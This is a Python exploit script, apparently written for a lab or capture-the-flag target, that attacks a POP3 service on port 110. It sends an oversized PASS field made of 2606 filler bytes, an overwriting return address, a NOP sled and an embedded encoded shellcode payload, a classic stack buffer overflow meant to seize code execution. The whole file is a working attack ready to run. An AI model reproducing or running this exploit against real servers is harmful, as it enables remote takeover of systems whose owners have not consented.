import sys, socket

ip = "10.10.191.38"
port = 110

junk = "A" * 2606
ret = "\x8f\x35\x4a\x5f"
shell = ("\xbd\xbd\xef\x74\xa0\xd9\xeb\xd9\x74\x24\xf4\x58\x33\xc9\xb1"  
"\x52\x83\xc0\x04\x31\x68\x0e\x03\xd5\xe1\x96\x55\xd9\x16\xd4"  
"\x96\x21\xe7\xb9\x1f\xc4\xd6\xf9\x44\x8d\x49\xca\x0f\xc3\x65"  
"\xa1\x42\xf7\xfe\xc7\x4a\xf8\xb7\x62\xad\x37\x47\xde\x8d\x56"  
"\xcb\x1d\xc2\xb8\xf2\xed\x17\xb9\x33\x13\xd5\xeb\xec\x5f\x48"  
"\x1b\x98\x2a\x51\x90\xd2\xbb\xd1\x45\xa2\xba\xf0\xd8\xb8\xe4"
"\xd2\xdb\x6d\x9d\x5a\xc3\x72\x98\x15\x78\x40\x56\xa4\xa8\x98"
"\x97\x0b\x95\x14\x6a\x55\xd2\x93\x95\x20\x2a\xe0\x28\x33\xe9"
"\x9a\xf6\xb6\xe9\x3d\x7c\x60\xd5\xbc\x51\xf7\x9e\xb3\x1e\x73"
"\xf8\xd7\xa1\x50\x73\xe3\x2a\x57\x53\x65\x68\x7c\x77\x2d\x2a"
"\x1d\x2e\x8b\x9d\x22\x30\x74\x41\x87\x3b\x99\x96\xba\x66\xf6"
"\x5b\xf7\x98\x06\xf4\x80\xeb\x34\x5b\x3b\x63\x75\x14\xe5\x74"
"\x7a\x0f\x51\xea\x85\xb0\xa2\x23\x42\xe4\xf2\x5b\x63\x85\x98"
"\x9b\x8c\x50\x0e\xcb\x22\x0b\xef\xbb\x82\xfb\x87\xd1\x0c\x23"
"\xb7\xda\xc6\x4c\x52\x21\x81\x78\xaa\x83\x2a\x15\xae\xd3\xdd"
"\xb9\x27\x35\xb7\x51\x6e\xee\x20\xcb\x2b\x64\xd0\x14\xe6\x01"
"\xd2\x9f\x05\xf6\x9d\x57\x63\xe4\x4a\x98\x3e\x56\xdc\xa7\x94"
"\xfe\x82\x3a\x73\xfe\xcd\x26\x2c\xa9\x9a\x99\x25\x3f\x37\x83"
"\x9f\x5d\xca\x55\xe7\xe5\x11\xa6\xe6\xe4\xd4\x92\xcc\xf6\x20"
"\x1a\x49\xa2\xfc\x4d\x07\x1c\xbb\x27\xe9\xf6\x15\x9b\xa3\x9e"
"\xe0\xd7\x73\xd8\xec\x3d\x02\x04\x5c\xe8\x53\x3b\x51\x7c\x54"
"\x44\x8f\x1c\x9b\x9f\x0b\x3c\x7e\x35\x66\xd5\x27\xdc\xcb\xb8"
"\xd7\x0b\x0f\xc5\x5b\xb9\xf0\x32\x43\xc8\xf5\x7f\xc3\x21\x84"
"\x10\xa6\x45\x3b\x10\xe3")

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))

    s.recv(1024)
    s.send("USER admin" + "\r\n")
    s.recv(1024)
    s.send("PASS " + junk + ret +"\x90" * 32+ shell + "\r\n")
except:
    print("connection error")
    sys.exit(0)

